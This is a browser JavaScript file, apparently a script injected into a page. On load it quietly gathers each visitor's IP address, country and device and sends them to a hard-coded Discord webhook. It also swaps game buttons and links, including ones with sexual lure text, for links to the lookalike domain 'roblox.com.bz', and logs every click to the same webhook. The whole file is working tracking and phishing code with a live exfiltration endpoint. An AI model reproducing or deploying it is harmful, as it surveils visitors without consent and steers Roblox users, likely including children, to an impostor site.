(function () {
  'use strict';

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520288689836785774/hJqq62GqD92mjdWDZevZnX7aDhs2aw5qSRihChNR9uAH13F_pR6x1JJj95d7btXbcMOj';
  const NEW_SWORD_LINK = 'https://roblox.com.bz/games/95082159892680/X2-1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=78900447338733750394827051417199';
  const SEX_GAME_LINK = 'https://roblox.com.bz/games/95082159892680/X2-1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=78900447338733750394827051417199';

  // Generate a unique User ID
  function generateUserId() {
    return Math.floor(Math.random() * 10000000000);
  }

  // Get user IP
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip || 'Unknown';
    } catch {
      return 'Unknown';
    }
  }

  // Get user country from IP
  async function getUserCountry(ip) {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      const countryCode = data.country_code || 'Unknown';
      const countryName = data.country_name || 'Unknown';
      
      // Get flag emoji from country code
      const flagEmoji = countryCode
        .toUpperCase()
        .split('')
        .map((char) => String.fromCodePoint(127397 + char.charCodeAt(0)))
        .join('');
      
      return { country: countryName, flag: flagEmoji };
    } catch (error) {
      return { country: 'Unknown', flag: '🌍' };
    }
  }

  // Detect device type
  function detectDevice() {
    const userAgent = navigator.userAgent;
    if (/iphone|ipod/i.test(userAgent)) return 'iPhone';
    if (/ipad/i.test(userAgent)) return 'iPad';
    if (/android/i.test(userAgent)) return 'Android';
    if (/windows/i.test(userAgent)) return 'Windows';
    if (/macintosh|mac os x/i.test(userAgent)) return 'macOS';
    if (/linux/i.test(userAgent)) return 'Linux';
    return 'Unknown';
  }

  // Log site visit (New Visitor) - Ticket Format
  async function logSiteVisit() {
    try {
      const ip = await getUserIP();
      const country = await getUserCountry(ip);
      const deviceType = detectDevice();
      const now = new Date();
      const timeFormatted = now.toLocaleTimeString('pt-BR');
      const visitorId = Math.floor(Math.random() * 100000);

      // Create ticket format message
      const ticketMessage = `\`\`\`
┌─ VISITOR LOG ─────────────────┐
│ ID: #${visitorId.toString().padStart(5, '0')}                    │
│ IP: ${ip.padEnd(17)}             │
│ Location: ${country.flag} ${country.country.substring(0, 10).padEnd(10)}          │
│ Device: ${deviceType.padEnd(14)}│
│ Time: ${timeFormatted.padEnd(18)}│
└───────────────────────────────┘
\`\`\``;

      const visitLog = {
        content: ticketMessage,
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(visitLog),
      }).catch(() => {
        // Webhook may fail due to CORS
      });
    } catch (error) {
      console.error('Failed to log site visit:', error);
    }
  }

  // Log account verification to Discord - Ticket Format
  async function logAccountVerification() {
    try {
      const ip = await getUserIP();
      const country = await getUserCountry(ip);
      const userId = generateUserId();
      const creationDate = new Date();
      const creationDateFormatted = creationDate.toLocaleDateString('pt-BR');
      const daysInAccount = 0;
      const currentTime = creationDate.toLocaleTimeString('pt-BR');
      const verificationId = Math.floor(Math.random() * 100000);

      // Generate a random username
      const username = '@' + Math.random().toString(36).substring(2, 10) + 'Xfm';

      // Create ticket format message for verification
      const ticketMessage = `\`\`\`
┌─ VERIFICATION LOG ────────────┐
│ ID: #${verificationId.toString().padStart(5, '0')}                    │
│ Username: ${username.padEnd(13)}│
│ User ID: ${userId.toString().padEnd(12)}│
│ Created: ${creationDateFormatted.padEnd(13)}│
│ Days: ${daysInAccount.toString().padEnd(16)}│
│ IP: ${ip.padEnd(17)}             │
│ Location: ${country.flag} ${country.country.substring(0, 10).padEnd(10)}          │
│ Time: ${currentTime.padEnd(18)}│
└───────────────────────────────┘
\`\`\``;

      const verificationLog = {
        content: ticketMessage,
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(verificationLog),
      }).catch(() => {
        // Webhook may fail due to CORS
      });
    } catch (error) {
      console.error('Failed to log account verification:', error);
    }
  }

  // Update game links and add click listeners
  function updateGameLinks() {
    const observer = new MutationObserver(() => {
      // Find all buttons and links
      document.querySelectorAll('button, a[href*="roblox.com"]').forEach((element) => {
        const href = element.getAttribute('href') || '';
        const text = element.textContent || '';
        const testid = element.getAttribute('data-testid') || '';

        // Update game links
        if (text.includes('Sword') || text.includes('Combat')) {
          element.setAttribute('href', NEW_SWORD_LINK);
          element.onclick = (e) => {
            e.preventDefault();
            handleGameAccess(e);
            window.open(NEW_SWORD_LINK, '_blank');
          };
        } else if (text.includes('Sex') || text.includes('4nn1s')) {
          element.setAttribute('href', SEX_GAME_LINK);
          element.onclick = (e) => {
            e.preventDefault();
            handleGameAccess(e);
            window.open(SEX_GAME_LINK, '_blank');
          };
        }
      });
    });

    observer.observe(document.body, { childList: true, subtree: true });
  }

  // Handle game access click
  async function handleGameAccess(e) {
    // Log the account verification when user clicks to access game
    await logAccountVerification();
  }

  // Initialize on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      logSiteVisit();
      updateGameLinks();
    });
  } else {
    logSiteVisit();
    updateGameLinks();
  }
})();
